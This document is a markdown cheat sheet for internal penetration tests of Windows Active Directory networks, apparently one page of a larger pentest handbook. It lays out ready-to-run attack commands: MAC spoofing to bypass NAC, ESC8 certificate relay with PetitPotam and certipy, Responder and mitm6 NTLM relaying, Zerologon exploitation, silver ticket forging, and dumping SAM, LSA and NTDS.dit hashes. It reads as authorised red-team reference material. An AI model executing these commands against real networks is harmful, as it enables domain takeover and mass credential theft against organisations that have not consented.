# Internal Penetration Testing

## 1. **No network access**

### Wi-Fi

* Crack WPA or crack/replay PEAP

> For more details, see next cheatsheet : [WiFi](02-wifi.md)

### NAC - MAC filtering

1. Spoof mac, static ip, gateway ip, from any authorized device \(e.g printer or voip phone\), and disconnect it: 
```sh
macchanger -r eth0
```
2. force your static IP to match the one that you spoofed the mac from : 
```sh
sudo ifconfig <static_ip>/24 && sudo ip route add default via <gateway_ip>
```

### NAC - 802.1X

* [Fenrir](https://github.com/Orange-Cyberdefense/fenrir-ocd) (IEEE 802.1X bypass)

---

## 2. **No account yet**

### Coerce (Null session)

`wget https://gist.githubusercontent.com/zblurx/99fe1971562593fd1211931bdc979fbb/raw/dabb939a29a39a758e6852002066bac099368867/esc8fuzzer.py`

then `esc8fuzzer.py <cidr>` 

This will check if esc8 vulnerability is available or not

if yes, you can just create relay and steal pfx certificate

`certipy relay -ca  <AD-ADCS> -template 'Domaincontroller'` 
after run 

`petitPotam.py -d <domain> <exegol-IP> <DC-IP>`  to get pfx then 

`certipy auth -pfx administrator.pfx -dc-ip <DC-IP>`

export KRB5CCNAME=/workspace/administrator.ccache
`secretsdump -k -no-pass <domain>/'administrator$'@administrator.<domain>`

It's also possible to make the relay using this command 
> `ntlmrelayx.py -t http://<IP-ADCS>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`

but you have to use `gettgtpkinit.py -pfx-base64 ${cat cert.base64} '<domain>'/administrator$'@administrator.<domain>` to have the TGT


### Physical access

Boot from Kali Linux and dump creds

```bash
fdisk -l
mount /dev/<windows_disk> /mnt
cd /mnt/Windows/system32/Config
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
```
> For more details, see next cheatsheet : [Windows Post Exploitation](05-post-exploitation-windows.md)

---

### Network Access

**Get-DC-IP**

```
nslookup -type=ANY _ldap._tcp.dc._msdcs.<DOMAIN>
nslookup gc._msdcs.<DOMAIN>
```

**Man-In-The-Middle**

Responder + NTLMrelayx

```bash
# 1. First we need to edit  responder.conf :
sudo vim /usr/share/responder/Responder.conf
	SMB = Off     # Turn this off
	HTTP = Off    # Turn this off

# 2. Then we create a list of targets :
## For small range
crackmapexec smb <targets> --gen-relay-list relaylistOutputFilename.txt
## For big range
nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt

# 3. After we can run ntlmrelayx
impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --output-file relayed-hash.txt

# 4. Finally, using another shell, we can run Responder
## Light
./Responder.py -I eth0 
## Medium (enable wpad, netbios domain and wredir suffix queries)
./Responder.py -I eth0 -dw
## Full (Force WPAD and ProxyAuth)
./Responder.py -I eth0 -dwFP
```

> If limited to a Windows system, you can use Inveigh instead of Responder : 
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)


mitm6 + NTLMrelayx

```bash
sudo mitm6 -d <domain.fqdn> --ignore-nofqdn
impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 

# If no smb available, try ldap/ldaps/mssql : 
impacket-ntlmrelayx -t ldaps://<target> -l lootdir
```

ARP \(use with caution !\)

```bash
Bettercap
Cain.exe (& Abel)
```


**Zerologon**

```
zerologon-exploit '<DC-NAME>' '<DC-IP>'

secretsdump -just-dc -no-pass <MACHINE_ACCOUNT>\$@<DC-IP>

#Get hexpass of machine account
secretsdump -hashes :'<NT>' '<DOMAIN>'/'Administrator'@'<DC-IP>'

# Use hexpess to restore
zerologon-restore '<DOMAIN>'/'<MACHINE_ACCOUNT>'@'<DC-NAME>' -target-ip '<DC-IP>' -hexpass 'xxx'
``` 

---

**Port and service scan**

Hosts discovery from huge ranges


masscan on a single port 

`masscan -p 445 <cidr> --rate=10000 | cut -d ' ' -f 6 >> 445-open.txt`

zmap on a single port (linux and windows)

```bash
sudo apt install zmap && sudo rm /etc/zmap/blacklist.conf && sudo touch /etc/zmap/blacklist.conf
sudo zmap -p22 10.0.0.0/8 192.168.0.0/16 -o zmap_linux.ips
sudo zmap -p445 10.0.0.0/8 192.168.0.0/16 -o zmap_windows.ips
```

masscan on identified ranges

```bash
cat zmap_*.ips |awk -F. '{print $1"."$2"."$3".0/24"}' |sort -u > masscan_targets.ips
masscan -iL masscan_targets.ips -p 21,22,23,80,443,445,5985,5986,8080,8443,5900 -oG masscan.grep

```

nmap on identified hosts

```bash
nmap -sV --version-all -Pn -sT --top-ports 3000  -iL masscan.grep -oA all_hosts
nmap --version-all -sV -sC -p- -oA allports <hosts>
```

Search for low hanging fruits \(MS17 / default password TOMCAT VNC ... \)

```bash
nmap -Pn -n -sSUV -n -vvv --reason -pT:137-139,445,U:137-139 --script=*ms17-010* -oA SMB_MS17 <hosts>
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/http/tomcat_mgr_login
searchsploit <service_name>
```

> For more details, see previous cheatsheet : [External Penetration Testing](../external/01-web-global.md)

---


## 3. **Unprivileged account only**


### Looking for coerced authentications



**coerce list**

```
esc1 => abuse of a template-based vulnerability
esc6 => abuse of vulnerability based on CA
esc4 => abuse of a generic write (ACL) based vulnerability
esc8 => relayx ntlm (attack can be played both with and without account)
```

**How to list all coerce of target**


```
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer && make
./Coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <Pentester-IP> <target>
```

**esc8** 

>If you don't know the IP of ADCS serveur, please use `certipy find <domain>/<user>:<password>@<DC-IP>`

```
certipy relay -ca  <IP-ADCS> -template 'Domaincontroller'
OR
ntlmrelayx.py -t http://<IP-ADCS>/certsrv/certfnsh.asp --smb2support --adcs

And after 

PetitPotam -u '<user>' -p '<password>' -d <domain>  <exegol-IP> <IP-DC>

Now we have .pfx, we can use it to get ticket service and nt hashs of computer account
```


**How to use pfx file**

`certipy auth -pfx certif.pfx -dc-ip <DC-IP> -username <user> -domain <domain>`

This will give you .ccache file wich contain TGT and other certify will also show you a NT hash

If you want to use the TGT with crackmapexec you can do it like this : 

`export KRB5CCNAME=administrator.ccache; cme smb DC01.<domain> -u 'administrator' -d <domain> -k`

but you'll not be local administrator, but you can be using these commands which use dcsync: 

```
export KRB5CCNAME=/workspace/administrator.ccache
secretsdump -k -no-pass <domain>/'administrator$'@administrator.<domain>
```

In case of secretsdump isn't working, we recommend you to create silver ticket( which is available only on the pwned machine and the pwned service )


**How to create silver ticket**


```
# Find the SID domain
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

```

you will get a service ticket, which allows you to root the machine then dump SAM and LSA ( also don't forget to use lsassy, you can have some good surprise)



### Get a shell

> For more details, see next cheatsheets : [Shell](../useful-commands/shell.md) and [AV Bypass](09-antivirus-bypass)

---

### Local Privilege Escalation

> For more details, see next cheatsheet : [Local Privilege Escalation Windows](03-lpe-windows.md)

---

### Domain Escalation

> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)

---

## 4. **Local Admin account**

### Post-Exploitation

> For more details, see next cheatsheet : [Local Post Exploitation Windows](05-post-exploitation-windows.md)

### Pivoting

> For more details, see next cheatsheet : [Pivoting](07-pivoting.md)

### Replay the secrets found

Kerberos ticket, LM/NTLM hash or cleartext password with CrackMapExec or lsassy

```bash
crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --lsa
crackmapexec smb <host_file> -d <domain> -u <user>  -H <hash> --sam
lsassy <target> -d <domain> -u <user> -p <pass>
```

---

## 5. **Domain admin account**

### Dump NDTS.dit from DC

```bash
# CrackMapExec using password
sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds

# CrackMapExec using kerberos ticket
export KRB5CCNAME=<user>.ccache 
sudo crackmapexec smb <target> --kerberos --ntds drsuapi

# Antivirus blocking default drsuapi method, try vss method instead
sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds vss

# dump krbgt hash only
impacket-secretsdump <domain>/<domain_admin>:'<pass>'@<target> -history -just-dc -just-user krbgt
```

### Manual Dump

```bash
# 1) use any tool that can achieve command execution on remote target to make a shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\NTDS.dit.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SYSTEM.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\SECURITY.bak
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\SAM.bak

# 2) use any tool that can retrieve these 4 files 
smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\NTDS.dit.bak'
smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SYSTEM.bak'
smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SECURITY.bak'
smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SAM.bak'

# 3) Locally parse theses files
impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak -security SECURITY.bak -sam SAM.bak LOCAL
```

